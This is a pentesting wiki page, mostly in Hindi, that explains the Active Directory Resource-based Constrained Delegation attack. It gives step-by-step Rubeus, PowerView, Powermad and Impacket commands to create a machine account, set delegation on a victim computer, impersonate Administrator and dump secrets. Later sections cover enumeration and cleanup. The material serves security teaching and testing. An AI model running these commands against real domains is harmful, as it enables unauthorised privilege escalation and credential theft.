# Resource-based Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}


## Basics of Resource-based Constrained Delegation

यह basic [Constrained Delegation](constrained-delegation.md) के समान है, पर **instead** किसी **object** को किसी **machine** के खिलाफ किसी भी user को **impersonate** करने की permissions देने के बजाय, Resource-based Constrain Delegation यह निर्धारित करता है कि किस **object** में यह क्षमता है कि वह उसके खिलाफ किसी भी user को impersonate कर सके।

इस मामले में constrained object के पास _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ नाम का एक attribute होगा, जिसमें उस user का नाम होगा जो उसके खिलाफ किसी भी अन्य user को impersonate कर सकता है।

Constrained Delegation और अन्य delegations के बीच एक और महत्वपूर्ण अंतर यह है कि किसी भी user के पास **write permissions over a machine account** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) हो तो वह **_msDS-AllowedToActOnBehalfOfOtherIdentity_** सेट कर सकता है (अन्य प्रकार की Delegation में आपको domain admin privs चाहिए होते हैं)।

### नए कॉन्सेप्ट्स

Constrained Delegation में पहले कहा गया था कि user के _userAccountControl_ मान के अंदर मौजूद **`TrustedToAuthForDelegation`** flag की आवश्यकता होती है ताकि **S4U2Self** किया जा सके। लेकिन यह पूरी तरह सच नहीं है। असलियत यह है कि उस value के बिना भी आप किसी भी user पर **S4U2Self** कर सकते हैं यदि आप एक **service** हैं (SPN हो), पर अगर आपके पास **`TrustedToAuthForDelegation`** है तो वापस किया गया TGS **Forwardable** होगा और यदि वह flag नहीं है तो वापस किया गया TGS **Forwardable** नहीं होगा।

हालाँकि, यदि **S4U2Proxy** में प्रयुक्त **TGS** **NOT Forwardable** है, तो एक सामान्य Constrain Delegation का दुरुपयोग करने की कोशिश **काम नहीं करेगी**। लेकिन यदि आप **Resource-Based constrain delegation** का शोषण करने की कोशिश कर रहे हैं, तो यह काम करेगा।

### Attack संरचना

> यदि आपके पास किसी **Computer** account पर **write equivalent privileges** हैं तो आप उस machine में **privileged access** प्राप्त कर सकते हैं।

मान लें कि attacker के पास पहले से ही **write equivalent privileges over the victim computer** हैं।

1. attacker किसी ऐसे account को **compromises** करता है जिसमें **SPN** हो या **creates one** (“Service A”). ध्यान दें कि **any** _Admin User_ बिना किसी अन्य विशेष privilege के भी 10 तक Computer objects (**_MachineAccountQuota_**) बना सकता है और उनमें एक **SPN** सेट कर सकता है। इसलिए attacker बस एक Computer object बना कर उसमें SPN सेट कर सकता है।
2. attacker victim computer (ServiceB) पर अपनी **WRITE privilege** का दुरुपयोग करके **resource-based constrained delegation to allow ServiceA to impersonate any user** उस victim computer (ServiceB) के खिलाफ कॉन्फ़िगर कर देता है।
3. attacker Rubeus का उपयोग कर Service A से Service B के लिए एक **full S4U attack** (S4U2Self and S4U2Proxy) करता है उस user के लिए जिसके पास Service B तक **privileged access** है।
1. S4U2Self (SPN compromised/created account से): मेरे लिए **TGS of Administrator to me** माँगें (Not Forwardable)।
2. S4U2Proxy: पिछले चरण का **not Forwardable TGS** उपयोग कर **Administrator** से **victim host** के लिए **TGS** माँगें।
3. भले ही आप not Forwardable TGS का उपयोग कर रहे हों, Resource-based constrained delegation का शोषण कर रहे होने के कारण यह काम करेगा।
4. attacker **pass-the-ticket** कर सकता है और user को **impersonate** करके victim ServiceB तक **access** प्राप्त कर सकता है।

To check the _**MachineAccountQuota**_ of the domain you can use:
```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## हमला

### कंप्यूटर ऑब्जेक्ट बनाना

आप डोमेन के अंदर एक कंप्यूटर ऑब्जेक्ट **[powermad](https://github.com/Kevin-Robertson/Powermad):** का उपयोग करके बना सकते हैं
```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### Resource-based Constrained Delegation को कॉन्फ़िगर करना

**activedirectory PowerShell module का उपयोग**
```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**powerview का उपयोग**
```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### एक पूर्ण S4U attack करना (Windows/Rubeus)

सबसे पहले, हमने पासवर्ड `123456` के साथ नया Computer object बनाया, इसलिए हमें उस पासवर्ड का hash चाहिए:
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
यह उस खाते के लिए RC4 और AES hashes को प्रिंट करेगा.\ अब, हमला किया जा सकता है:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
आप Rubeus के `/altservice` पैरामीटर का उपयोग करके एक बार पूछकर ही कई सेवाओं के लिए और टिकट जनरेट कर सकते हैं:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
> [!CAUTION]
> ध्यान दें कि उपयोगकर्ताओं के पास "**Cannot be delegated**" नामक एक attribute होता है। यदि किसी user के लिए यह attribute True है, तो आप उसे impersonate नहीं कर पाएंगे। यह property bloodhound के अंदर देखी जा सकती है।

### Linux tooling: end-to-end RBCD with Impacket (2024+)

यदि आप Linux से ऑपरेट करते हैं, तो आप आधिकारिक Impacket tools का उपयोग करके पूरा RBCD chain कर सकते हैं:
```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```
Notes
- यदि LDAP signing/LDAPS लागू है, तो `impacket-rbcd -use-ldaps ...` का उपयोग करें।
- AES keys को प्राथमिकता दें; कई आधुनिक डोमेन RC4 पर प्रतिबंध लगाते हैं। Impacket और Rubeus दोनों AES-only flows का समर्थन करते हैं।
- Impacket कुछ टूल्स के लिए `sname` ("AnySPN") को पुनर्लेखित कर सकता है, लेकिन जहाँ संभव हो सही SPN प्राप्त करें (उदा., CIFS/LDAP/HTTP/HOST/MSSQLSvc).

### पहुँच

अंतिम कमांड लाइन **complete S4U attack and will inject the TGS** Administrator से लक्ष्य होस्ट की **मेमोरी** में निष्पादित करेगा।\
इस उदाहरण में Administrator से **CIFS** सेवा के लिए TGS का अनुरोध किया गया था, इसलिए आप **C$** तक पहुँच सकेंगे:
```bash
ls \\victim.domain.local\C$
```
### विभिन्न सेवा टिकटों का दुरुपयोग

जानें [**available service tickets here**](silver-ticket.md#available-services)।

## सूचीकरण, ऑडिट और सफाई

### RBCD कॉन्फ़िगर किए गए कंप्यूटरों की सूची बनाना

PowerShell (SD को डीकोड करके SIDs को रिज़ॉल्व करने के लिए):
```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
ForEach-Object {
$raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
$sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
$sd.DiscretionaryAcl | ForEach-Object {
$sid  = $_.SecurityIdentifier
try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
[PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
}
}
```
Impacket (एक ही कमांड से पढ़ें या फ़्लश करें):
```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```
### सफ़ाई / RBCD रीसेट

- PowerShell (attribute को साफ़ करें):
```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```
- Impacket:
```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```
## Kerberos त्रुटियाँ

- **`KDC_ERR_ETYPE_NOTSUPP`**: इसका मतलब है कि Kerberos को DES या RC4 का उपयोग न करने के लिए कॉन्फ़िगर किया गया है और आप सिर्फ RC4 हैश दे रहे हैं। Rubeus को कम से कम AES256 हैश दें (या बस rc4, aes128 और aes256 हैश सब दें). उदाहरण: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- **`KRB_AP_ERR_SKEW`**: इसका मतलब है कि वर्तमान कंप्यूटर का समय DC के समय से अलग है और Kerberos सही ढंग से काम नहीं कर रहा है।
- **`preauth_failed`**: इसका मतलब है कि दिए गए username + hashes लॉगिन के लिए काम नहीं कर रहे हैं। हो सकता है कि आपने हैश बनाते समय username में "$" डालना भूल गए हों (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
- **`KDC_ERR_BADOPTION`**: इसका मतलब हो सकता है:
- आप जिस user का impersonate करने की कोशिश कर रहे हैं वह इच्छित सेवा तक पहुँच नहीं सकता (क्योंकि आप उसे impersonate नहीं कर सकते या उसके पास पर्याप्त privileges नहीं हैं)
- माँगी गई सेवा मौजूद नहीं है (यदि आप winrm के लिए टिकट माँगते हैं पर winrm चल नहीं रहा है)
- जो fakecomputer बनाया गया है उसने vulnerable सर्वर पर अपने privileges खो दिए हैं और आपको उन्हें वापस देने की आवश्यकता है।
- आप classic KCD का दुरुपयोग कर रहे हैं; याद रखें RBCD non-forwardable S4U2Self टिकट्स के साथ काम करता है, जबकि KCD को forwardable की आवश्यकता होती है।

## नोट्स, relays और विकल्प

- यदि LDAP फ़िल्टर किया गया है तो आप AD Web Services (ADWS) के ऊपर RBCD SD भी लिख सकते हैं। देखें:


{{#ref}}
adws-enumeration.md
{{#endref}}

- Kerberos relay chains अक्सर एक कदम में local SYSTEM प्राप्त करने के लिए RBCD में समाप्त होते हैं। व्यावहारिक end-to-end उदाहरण देखें:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

- यदि LDAP signing/channel binding **disabled** हैं और आप एक machine account बना सकते हैं, तो **KrbRelayUp** जैसे टूल एक coerced Kerberos auth को LDAP पर relay कर सकते हैं, आपके machine account के लिए target computer object पर `msDS-AllowedToActOnBehalfOfOtherIdentity` सेट कर सकते हैं, और off-host से S4U के माध्यम से तुरंत **Administrator** का impersonate कर सकते हैं।

## संदर्भ

- [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
- [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)
- [https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- Impacket rbcd.py (official): https://github.com/fortra/impacket/blob/master/examples/rbcd.py
- Quick Linux cheatsheet with recent syntax: https://tldrbins.github.io/rbcd/
- [0xdf – HTB Bruno (LDAP signing off → Kerberos relay to RBCD)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)


{{#include ../../banners/hacktricks-training.md}}
